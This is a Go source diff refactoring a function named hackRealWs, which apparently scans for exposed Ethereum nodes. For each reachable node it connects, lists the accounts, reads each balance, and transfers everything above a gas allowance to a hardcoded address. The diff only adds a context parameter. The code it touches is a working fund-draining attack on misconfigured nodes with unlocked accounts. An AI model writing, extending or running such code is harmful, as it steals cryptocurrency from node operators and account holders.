@@ -127,8 +127,9 @@ func (pxy *proxy) hackRealWs() {
 			logger.Error(addr, ":", err)
 			continue
 		}
+		ctx := context.Background()
 		// 	//if connected write to redis set
-		_, err := conn.BlockByNumber(context.Background(), nil)
+		_, err := conn.BlockByNumber(ctx, nil)
 		if err != nil {
 			logger.Error("Get block number error", err)
 			continue
@@ -136,16 +137,16 @@ func (pxy *proxy) hackRealWs() {
 		if err == nil {
 			logger.Info("GetBlockNumber:", addr)
 			// red.WriteRealEthPort(addr)
-			acc, err2 := conn.GetAccounts()
+			acc, err2 := conn.GetAccounts(ctx)
 			if err2 == nil {
 				logger.Info("GetAccounts:", addr)
 				for _, a := range acc {
-					balance, err2 := conn.GetBalance(a)
+					balance, err2 := conn.GetBalance(ctx, a)
 					if err2 == nil {
 						logger.Info("GetBalance:", addr)
 						left := balance.Sub(balance, big.NewInt(22000*22000000000))
 						if left.Cmp(big.NewInt(0)) > 0 {
-							conn.SendTransaction(a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
+							conn.SendTransaction(ctx, a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
 							logger.Info("sendtransaction:", addr)
 						}
 					}
